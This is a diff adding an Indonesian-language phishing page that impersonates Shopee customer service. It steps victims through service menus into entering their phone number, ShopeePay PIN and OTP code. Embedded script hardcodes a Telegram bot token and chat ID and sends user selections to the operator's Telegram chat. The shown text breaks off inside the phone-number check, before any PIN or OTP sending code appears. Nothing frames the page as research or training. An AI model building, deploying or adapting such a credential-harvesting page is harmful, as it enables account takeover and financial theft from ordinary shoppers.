@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Layanan Fitur Shopee</title>
+    <style>
+        :root {
+            --shopee-red: #ee4d2d;
+            --shopee-gradient: linear-gradient(135deg, #ee4d2d 0%, #ff6a3c 100%);
+            --text-primary: #111111;
+            --text-secondary: #444444;
+            --border-color: #cccccc;
+            --bg-gray: #f7f7f7;
+            --bg-white: #ffffff;
+            --success-green: #00b42a;
+        }
+        * {margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
+        body {background-color:var(--bg-gray); min-height:100vh; color:var(--text-primary);}
+
+        .top-header {
+            display:flex; align-items:center; justify-content:center;
+            position:relative; padding:14px 16px;
+            background: var(--shopee-gradient);
+            box-shadow: 0 3px 10px rgba(238, 77, 45, 0.35);
+        }
+        .back-btn {
+            position:absolute; left:16px; top:50%; transform:translateY(-50%);
+            font-size:22px; color:#fff; border:none; background:none; cursor:pointer;
+        }
+        .header-title {font-size:17px; font-weight:700; color:#fff; text-align:center;}
+        .header-icons {position:absolute; right:16px; top:50%; transform:translateY(-50%); display:flex; gap:16px; font-size:20px; color:#fff;}
+
+        .logo-container {text-align:center; padding:28px 0 12px;}
+        .shopee-logo {
+            display:inline-flex; align-items:center; justify-content:center;
+            width:56px; height:52px; background:var(--shopee-gradient);
+            border-radius:0 0 8px 8px; color:#fff; font-size:36px; font-weight:900;
+            box-shadow: 0 6px 16px rgba(238, 77, 45, 0.45);
+        }
+
+        .container {max-width:480px; margin:0 auto;}
+        .page {display:none;}
+        .page.active {display:block;}
+        .card {padding:0 24px 24px;}
+        .card h2 {font-size:18px; text-align:center; margin-bottom:20px; font-weight:700;}
+
+        .menu-item {
+            display:flex; align-items:center; padding:16px 14px;
+            border:1px solid var(--border-color); border-radius:8px;
+            margin-bottom:12px; cursor:pointer; transition:all 0.25s ease; background:#fff;
+        }
+        .menu-item:hover {border-color:var(--shopee-red); background:#fff5f3; transform:translateY(-1px);}
+        .menu-icon {font-size:22px; margin-right:12px;}
+        .menu-text {font-size:15px; font-weight:600;}
+
+        .btn {
+            width:calc(100% - 48px); padding:14px; background:var(--shopee-gradient);
+            color:#fff; border:none; border-radius:6px; font-size:15px; font-weight:700;
+            cursor:pointer; margin:10px 24px 30px;
+        }
+        .btn:hover {opacity:0.9;}
+
+        .form-group {margin-bottom:16px;}
+        .form-input {
+            width:100%; padding:12px 14px; font-size:15px;
+            border:1px solid var(--border-color); border-radius:6px;
+            outline:none; background:#fff;
+        }
+        .form-input:focus {border-color:var(--shopee-red);}
+
+        .btn-lanjut {
+            width:100%; padding:14px; background:#ccc; color:#666;
+            border:none; border-radius:6px; font-size:15px;
+            font-weight:600; margin-top:10px; cursor:not-allowed;
+        }
+        .btn-lanjut.active {
+            background:var(--shopee-gradient); color:#fff;
+            cursor:pointer; font-weight:700;
+        }
+
+        .code-container {display:flex; gap:10px; justify-content:center; margin:24px 0;}
+        .code-input {width:45px; height:50px; text-align:center; font-size:20px; font-weight:bold; padding:0;}
+        .desc-text {text-align:center; font-size:13px; color:#666; margin-bottom:10px; line-height:1.5;}
+        .resend-link {text-align:center; font-size:14px; color:var(--shopee-red); cursor:pointer; text-decoration:none; margin-top:8px; display:inline-block;}
+
+        .toast {
+            position:fixed; top:60px; left:50%; transform:translateX(-50%) translateY(-10px);
+            background:#fff; padding:14px 20px; border-radius:8px;
+            box-shadow:0 4px 12px rgba(0,0,0,0.15);
+            display:flex; align-items:center; gap:10px;
+            opacity:0; transition:all 0.3s ease; z-index:9999;
+            max-width:90%; min-width:280px;
+        }
+        .toast.show {opacity:1; transform:translateX(-50%) translateY(0);}
+        .toast-icon {font-size:20px;}
+        .toast.success {border-left:4px solid var(--success-green);}
+        .toast.info {border-left:4px solid #1989fa;}
+        .toast-text {font-size:14px; font-weight:500; color:#333; line-height:1.4;}
+    </style>
+</head>
+<body>
+
+<div id="toast" class="toast">
+    <span id="toast-icon" class="toast-icon">✅</span>
+    <span id="toast-text" class="toast-text">Berhasil</span>
+</div>
+
+<div class="container">
+
+<div id="page-fitur" class="page active">
+    <div class="top-header">
+        <span class="header-title">Pilih Layanan</span>
+        <div class="header-icons"><span>❓</span></div>
+    </div>
+    <div class="logo-container"><div class="shopee-logo">S</div></div>
+    <div class="card">
+        <h2>Pilih Fitur Layanan</h2>
+        <div class="menu-item" onclick="pilihFitur('Update Resi')">
+            <span class="menu-icon">📝</span><span class="menu-text">Update Resi</span>
+        </div>
+        <div class="menu-item" onclick="pilihFitur('Pesanan Bermasalah')">
+            <span class="menu-icon">📦</span><span class="menu-text">Pesanan Bermasalah</span>
+        </div>
+        <div class="menu-item" onclick="pilihFitur('Pemblokiran Perangkat')">
+            <span class="menu-icon">📱</span><span class="menu-text">Pemblokiran Perangkat Tidak Dikenal</span>
+        </div>
+    </div>
+</div>
+
+<div id="page-login" class="page">
+    <div class="top-header">
+        <button class="back-btn" onclick="kembaliDanLapor('fitur')">←</button>
+        <span class="header-title">Verifikasi Akun</span>
+        <div class="header-icons"><span>🛒</span></div>
+    </div>
+    <div class="logo-container"><div class="shopee-logo">S</div></div>
+    <div class="card">
+        <h2>Masukkan Nomor HP</h2>
+        <div class="form-group">
+            <input type="tel" class="form-input" id="nomor-hp" placeholder="08xxxxxxxxxx" inputmode="numeric" oninput="cekLogin()">
+        </div>
+        <button class="btn-lanjut" id="btn-login" onclick="simpanNomorDanLanjut()">Lanjut</button>
+    </div>
+</div>
+
+<div id="page-pin" class="page">
+    <div class="top-header">
+        <button class="back-btn" onclick="kembaliDanLapor('login')">←</button>
+        <span class="header-title">Masukkan PIN</span>
+    </div>
+    <div class="logo-container"><div class="shopee-logo">S</div></div>
+    <div class="card">
+        <h2>Verifikasi PIN ShopeePay</h2>
+        <p class="desc-text">Masukkan 6 digit PIN akun Anda</p>
+        <div class="code-container">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="p1" oninput="pindahPin(1)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="p2" oninput="pindahPin(2)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="p3" oninput="pindahPin(3)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="p4" oninput="pindahPin(4)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="p5" oninput="pindahPin(5)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="p6" oninput="pindahPin(6)">
+        </div>
+        <button class="btn-lanjut" id="btn-pin" onclick="kirimPin()">Kirim Kode OTP</button>
+    </div>
+</div>
+
+<div id="page-otp" class="page">
+    <div class="top-header">
+        <button class="back-btn" onclick="kembaliDanLapor('pin')">←</button>
+        <span class="header-title">Verifikasi OTP</span>
+        <div class="header-icons"><span>🔐</span></div>
+    </div>
+    <div class="logo-container"><div class="shopee-logo">S</div></div>
+    <div class="card">
+        <h2>Masukkan Kode OTP</h2>
+        <p class="desc-text">Kode verifikasi telah dikirim ke nomor<br><strong id="nomor-terkirim">08xxxxxxxxx</strong></p>
+        <div class="code-container">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="otp1" oninput="pindahOtp(1)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="otp2" oninput="pindahOtp(2)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="otp3" oninput="pindahOtp(3)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="otp4" oninput="pindahOtp(4)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="otp5" oninput="pindahOtp(5)">
+            <input type="text" maxlength="1" inputmode="numeric" class="form-input code-input" id="otp6" oninput="pindahOtp(6)">
+        </div>
+        <button class="btn-lanjut" id="btn-otp" onclick="kirimOtp()">Verifikasi</button>
+        <p class="desc-text" style="margin-top:15px;">Tidak menerima kode?</p>
+        <a class="resend-link" onclick="kirimKeTelegram('OTP: Kirim Ulang'); tampilNotifikasi('info', 'Kode OTP baru telah dikirim!')">Kirim Ulang Kode</a>
+    </div>
+</div>
+
+<div id="page-pilih-hp" class="page">
+    <div class="top-header">
+        <button class="back-btn" onclick="kembaliDanLapor('fitur')">←</button>
+        <span class="header-title">Pemblokiran Perangkat</span>
+    </div>
+    <div class="logo-container"><div class="shopee-logo">S</div></div>
+    <div class="card">
+        <h2>Pilih Tipe HP</h2>
+        <div class="menu-item" onclick="kirimKeTelegram('Perangkat: iPhone'); showPage('login')">
+            <span class="menu-icon">🍎</span><span class="menu-text">iPhone</span>
+        </div>
+        <div class="menu-item" onclick="kirimKeTelegram('Perangkat: Samsung'); showPage('login')">
+            <span class="menu-icon">📱</span><span class="menu-text">Samsung</span>
+        </div>
+        <div class="menu-item" onclick="kirimKeTelegram('Perangkat: Lainnya'); showPage('login')">
+            <span class="menu-icon">📲</span><span class="menu-text">HP Lainnya</span>
+        </div>
+    </div>
+</div>
+
+<div id="page-pesanan" class="page">
+    <div class="top-header">
+        <button class="back-btn" onclick="kembaliDanLapor('fitur')">←</button>
+        <span class="header-title">Pesanan Bermasalah</span>
+        <div class="header-icons"><span>📦</span></div>
+    </div>
+    <div class="logo-container"><div class="shopee-logo">S</div></div>
+    <div class="card">
+        <h2>Pilih Masalah</h2>
+        <div class="menu-item" onclick="kirimKeTelegram('Masalah: Salah Alamat'); showPage('login')">
+            <span class="menu-icon">📍</span><span class="menu-text">Salah Alamat</span>
+        </div>
+        <div class="menu-item" onclick="kirimKeTelegram('Masalah: Retur'); showPage('login')">
+            <span class="menu-icon">📦</span><span class="menu-text">Retur</span>
+        </div>
+        <div class="menu-item" onclick="kirimKeTelegram('Masalah: Lainnya'); showPage('login')">
+            <span class="menu-icon">🚩</span><span class="menu-text">Lainnya</span>
+        </div>
+    </div>
+</div>
+
+<div id="page-sukses" class="page">
+    <div class="top-header">
+        <button class="back-btn" onclick="kembaliDanLapor('fitur')">←</button>
+        <span class="header-title">Berhasil</span>
+    </div>
+    <div class="logo-container"><div class="shopee-logo">S</div></div>
+    <div style="text-align:center; padding:40px 24px;">
+        <div style="font-size:60px;">✅</div>
+        <h2 style="margin:20px 0;">Berhasil Diproses</h2>
+        <p style="color:#555; line-height:1.6;">Terima kasih. Data Anda telah diverifikasi dan sedang diproses. Silakan tunggu konfirmasi maksimal 1×24 jam.</p>
+        <button class="btn" onclick="kembaliDanLapor('fitur')">Kembali ke Menu</button>
+    </div>
+</div>
+
+</div>
+
+<script>
+const BOT_TOKEN = "9131548020:AAFpxfnPt-Bcna4ieQ0KY41TOmcdGsh6DnU";
+const CHAT_ID = "8742715825";
+let nomorHP = '';
+
+function tampilNotifikasi(jenis, pesan) {
+    const toast = document.getElementById('toast');
+    const icon = document.getElementById('toast-icon');
+    const text = document.getElementById('toast-text');
+    toast.classList.remove('success', 'info');
+    if (jenis === 'success') {
+        toast.classList.add('success');
+        icon.textContent = '✅';
+    } else if (jenis === 'info') {
+        toast.classList.add('info');
+        icon.textContent = 'ℹ️';
+    }
+    text.textContent = pesan;
+    toast.classList.add('show');
+    setTimeout(() => { toast.classList.remove('show'); }, 3000);
+}
+
+function kirimKeTelegram(pesan) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
+    }).catch(e=>console.log('Telegram error:', e));
+}
+
+function showPage(id) {
+    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+    document.getElementById('page-'+id).classList.add('active');
+}
+
+function kembaliDanLapor(tujuan) {
+    showPage(tujuan);
+}
+
+function pilihFitur(nama) {
+    kirimKeTelegram('Fitur dipilih: ' + nama);
+    if (nama === 'Pemblokiran Perangkat') showPage('pilih-hp');
+    else if (nama === 'Pesanan Bermasalah') showPage('pesanan');
+    else showPage('login');
+}
+
+function cekLogin() {
+    const val = document.getElementById('nomor-hp').value.trim();
